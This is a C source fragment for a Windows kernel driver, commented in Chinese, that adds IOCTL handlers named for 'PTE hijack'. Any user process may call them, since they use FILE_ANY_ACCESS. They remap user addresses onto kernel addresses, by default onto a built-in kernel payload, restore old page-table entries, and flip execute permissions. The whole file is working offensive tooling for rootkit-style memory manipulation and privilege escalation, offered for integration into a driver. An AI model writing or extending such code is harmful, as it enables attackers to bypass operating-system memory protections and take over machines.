/*
 * ioctl_pte_handler.c
 * 集成进现有 rpc_dispatch.c 的 IOCTL 处理片段
 * 将此函数挂入你的 IRP_MJ_DEVICE_CONTROL 派发表
 */

#include "pte_hijack.h"
#include "kernel_payload.c" // 或单独编译链接

#define IOCTL_PTE_HIJACK_REMAP   CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PTE_HIJACK_RESTORE CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PTE_HIJACK_SET_EXEC CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

#pragma pack(push, 1)
typedef struct _REMAP_REQUEST {
    ULONG64 UserVa;
    ULONG64 KernelVa; // 若为0，使用驱动内置 KernelPayload_UserCallable
} REMAP_REQUEST, *PREMAP_REQUEST;

typedef struct _RESTORE_REQUEST {
    ULONG64 UserVa;
    ULONG64 OldPte;
} RESTORE_REQUEST, *PRESTORE_REQUEST;

typedef struct _SET_EXEC_REQUEST {
    ULONG64 Va;
    BOOLEAN EnableExecute;
} SET_EXEC_REQUEST, *PSET_EXEC_REQUEST;

typedef struct _REMAP_RESPONSE {
    ULONG64 OldPte;
    ULONG64 PageOffset; // payload 函数在物理页内的偏移
} REMAP_RESPONSE, *PREMAP_RESPONSE;
#pragma pack(pop)

// ----------------------------------------------------------------
// IRP_MJ_DEVICE_CONTROL 处理
// ----------------------------------------------------------------
NTSTATUS IoctlPteHijack_Dispatch(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG_PTR info = 0;

    PVOID inBuf  = Irp->AssociatedIrp.SystemBuffer;
    PVOID outBuf = Irp->AssociatedIrp.SystemBuffer;
    ULONG inLen  = IoStack->Parameters.DeviceIoControl.InputBufferLength;
    ULONG outLen = IoStack->Parameters.DeviceIoControl.OutputBufferLength;
    ULONG code   = IoStack->Parameters.DeviceIoControl.IoControlCode;

    switch (code)
    {
    case IOCTL_PTE_HIJACK_REMAP:
    {
        if (inLen < sizeof(REMAP_REQUEST) || outLen < sizeof(REMAP_RESPONSE))
        {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        PREMAP_REQUEST  req  = (PREMAP_REQUEST)inBuf;
        PREMAP_RESPONSE resp = (PREMAP_RESPONSE)outBuf;

        // 初始化 PteBase（懒初始化）
        status = PteHijack_Init();
        if (!NT_SUCCESS(status)) break;

        // 目标内核函数：若 R3 未指定，用内置 payload
        ULONG64 kernelVa = req->KernelVa;
        if (!kernelVa)
            kernelVa = (ULONG64)KernelPayload_UserCallable;

        ULONG64 pageOffset = kernelVa & 0xFFFULL; // 函数在页内偏移

        ULONG64 oldPte = 0;
        status = PteHijack_Remap(req->UserVa, kernelVa, &oldPte);
        if (!NT_SUCCESS(status)) break;

        resp->OldPte     = oldPte;
        resp->PageOffset = pageOffset;
        info = sizeof(REMAP_RESPONSE);
        break;
    }

    case IOCTL_PTE_HIJACK_RESTORE:
    {
        if (inLen < sizeof(RESTORE_REQUEST))
        {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        PRESTORE_REQUEST req = (PRESTORE_REQUEST)inBuf;
        status = PteHijack_Restore(req->UserVa, req->OldPte);
        break;
    }

    case IOCTL_PTE_HIJACK_SET_EXEC:
    {
        if (inLen < sizeof(SET_EXEC_REQUEST))
        {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        PSET_EXEC_REQUEST req = (PSET_EXEC_REQUEST)inBuf;
        status = PteHijack_SetExecution(req->Va, req->EnableExecute);
        break;
    }

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status      = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
